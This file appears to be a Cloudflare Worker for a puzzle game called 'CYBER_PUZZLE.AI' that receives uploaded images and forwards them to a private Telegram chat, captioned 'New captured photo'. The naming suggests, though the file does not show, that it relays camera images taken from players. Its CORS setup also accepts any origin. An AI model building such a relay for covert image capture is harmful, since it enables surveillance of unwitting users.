/**
 * Cloudflare Worker / Pages Advanced Mode Handler for CYBER_PUZZLE.AI
 * 
 * Intercepts /upload for Telegram photo delivery and serves static assets for all other routes.
 * 
 * Required Secrets:
 * - TELEGRAM_BOT_TOKEN
 * - TELEGRAM_CHAT_ID
 */

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin') || '';
    
    let allowOrigin = 'https://dhruv-coder-128.github.io';
    
    if (!origin || origin === 'null') {
        allowOrigin = '*';
    } else if (
        origin === 'https://dhruv-coder-128.github.io' ||
        origin.endsWith('.github.io') ||
        origin.startsWith('http://localhost') ||
        origin.startsWith('http://127.0.0.1')
    ) {
        allowOrigin = origin;
    } else {
        allowOrigin = origin;
    }

    return {
        'Access-Control-Allow-Origin': allowOrigin,
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        'Access-Control-Max-Age': '86400',
        'Vary': 'Origin',
    };
}

function jsonResponse(data, status = 200, request = null) {
    const corsHeaders = request ? getCorsHeaders(request) : {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
    };

    return new Response(JSON.stringify(data, null, 2), {
        status,
        headers: {
            'Content-Type': 'application/json',
            ...corsHeaders,
        },
    });
}

async function handleUpload(request, env) {
    const corsHeaders = getCorsHeaders(request);

    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
        console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Cloudflare secrets');
        return jsonResponse({
            error: 'Server configuration error',
            message: 'TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured in Cloudflare Worker secrets.'
        }, 500, request);
    }

    try {
        const contentType = request.headers.get('content-type') || '';
        let photo = null;
        let timestamp = new Date().toISOString();
        let gridSize = '3x3';

        if (contentType.includes('multipart/form-data')) {
            const formData = await request.formData();
            photo = formData.get('photo') || formData.get('image') || formData.get('file');
            timestamp = formData.get('timestamp') || timestamp;
            gridSize = formData.get('gridSize') || gridSize;
        } else if (contentType.includes('application/json')) {
            const body = await request.json();
            if (body.image || body.photo) {
                const rawBase64 = (body.image || body.photo).replace(/^data:image\/\w+;base64,/, '');
                const binary = Uint8Array.from(atob(rawBase64), c => c.charCodeAt(0));
                photo = new Blob([binary], { type: 'image/jpeg' });
            }
            timestamp = body.timestamp || timestamp;
            gridSize = body.gridSize || gridSize;
        } else {
            const buffer = await request.arrayBuffer();
            if (buffer && buffer.byteLength > 0) {
                photo = new Blob([buffer], { type: 'image/jpeg' });
            }
        }

        if (!photo) {
            return jsonResponse({
                error: 'Bad Request',
                message: 'No photo provided in request. Expected multipart/form-data with field "photo".'
            }, 400, request);
        }

        let formattedTime = timestamp;
        try {
            formattedTime = new Date(timestamp).toLocaleString('en-US', {
                dateStyle: 'medium',
                timeStyle: 'medium'
            });
        } catch (e) {
            formattedTime = timestamp;
        }

        const caption = `📸 CYBER_PUZZLE.AI\nNew captured photo\nTime: ${formattedTime}\nGrid: ${gridSize}`;

        const tgFormData = new FormData();
        tgFormData.append('chat_id', env.TELEGRAM_CHAT_ID);
        tgFormData.append('photo', photo, 'captured_puzzle.jpg');
        tgFormData.append('caption', caption);

        const tgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const tgResponse = await fetch(tgUrl, {
            method: 'POST',
            body: tgFormData,
        });

        const tgResult = await tgResponse.json();

        if (!tgResponse.ok || !tgResult.ok) {
            console.error('Telegram API error:', tgResult);
            return jsonResponse({
                error: 'Telegram Delivery Failed',
                details: tgResult.description || 'Unknown Telegram API error'
            }, 500, request);
        }

        return jsonResponse({
            success: true,
            message: 'Photo delivered to Telegram successfully'
        }, 200, request);

    } catch (error) {
        console.error('Upload processing error:', error);
        return jsonResponse({
            error: 'Internal Server Error',
            message: error.message
        }, 500, request);
    }
}

export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const path = url.pathname.replace(/\/+$/, '') || '/';
        const corsHeaders = getCorsHeaders(request);

        // 1. API Route: /upload (OPTIONS, GET, POST)
        if (path === '/upload') {
            if (request.method === 'OPTIONS') {
                return new Response(null, { status: 204, headers: corsHeaders });
            }
            if (request.method === 'GET') {
                return jsonResponse({
                    status: 'online',
                    service: 'CYBER_PUZZLE.AI Telegram Delivery Worker',
                    endpoint: 'POST /upload',
                    corsAllowedOrigin: corsHeaders['Access-Control-Allow-Origin']
                }, 200, request);
            }
            if (request.method === 'POST') {
                return handleUpload(request, env);
            }
            return jsonResponse({ error: 'Method not allowed' }, 405, request);
        }

        // 2. Serve static assets if deployed in Cloudflare Pages or Worker with Assets
        if (env.ASSETS && typeof env.ASSETS.fetch === 'function') {
            return env.ASSETS.fetch(request);
        }

        // 3. Fallback for standalone worker root
        if (path === '/') {
            if (request.method === 'OPTIONS') {
                return new Response(null, { status: 204, headers: corsHeaders });
            }
            return jsonResponse({
                status: 'online',
                service: 'CYBER_PUZZLE.AI Telegram Delivery Worker',
                endpoints: { upload: 'POST /upload' }
            }, 200, request);
        }

        return new Response('Not found', { status: 404 });
    }
};
